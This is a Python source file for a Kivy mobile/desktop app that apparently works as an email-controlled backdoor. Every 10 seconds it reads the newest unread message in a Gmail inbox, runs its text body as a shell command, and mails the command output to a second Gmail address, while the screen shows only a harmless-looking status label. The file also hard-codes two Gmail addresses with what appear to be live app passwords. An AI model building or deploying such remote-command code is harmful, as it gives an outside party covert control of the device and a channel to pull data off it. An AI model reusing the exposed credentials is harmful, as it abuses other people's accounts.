# main.py

from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
import imaplib
import email
import smtplib
import subprocess
import time

class EmailApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')
        self.label = Label(text="Waiting for new messages...")
        self.layout.add_widget(self.label)

        Clock.schedule_interval(self.check_email, 10)  # Set interval to check email (in seconds)

        return self.layout

    def check_email(self, dt):
        try:
            # Your existing email checking logic here
            imap = imaplib.IMAP4_SSL("imap.gmail.com")
            imap.login("brunobrail335@gmail.com", "dimgwmkmtwsiaaiw")
            imap.select("inbox")
            status, messages = imap.search(None, "UNSEEN")
            if messages[0]:
                latest_message = messages[0].split()[-1]
                _, msg = imap.fetch(latest_message, "(RFC822)")
                email_message = email.message_from_bytes(msg[0][1])
                for part in email_message.walk():
                    if part.get_content_type() == "text/plain":
                        body = part.get_payload(decode=True).decode()
                        result_byte = (
                            subprocess.run(body, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout).decode(
                            'utf-8')
                        break
                msg = email.message.EmailMessage()
                msg.set_content(result_byte)
                msg['Subject'] = 'Result of command'
                msg['From'] = "brunobrail335@gmail.com"
                msg['To'] = "duejohn825@gmail.com"

                # send email with result
                with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
                    smtp.starttls()
                    smtp.login("duejohn825@gmail.com", "vekktzscbyhfvadv")
                    smtp.send_message(msg)
            imap.close()
            imap.logout()

            # Update the label with the result or status
            self.label.text = f"Result: {result_byte}"

        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    EmailApp().run()
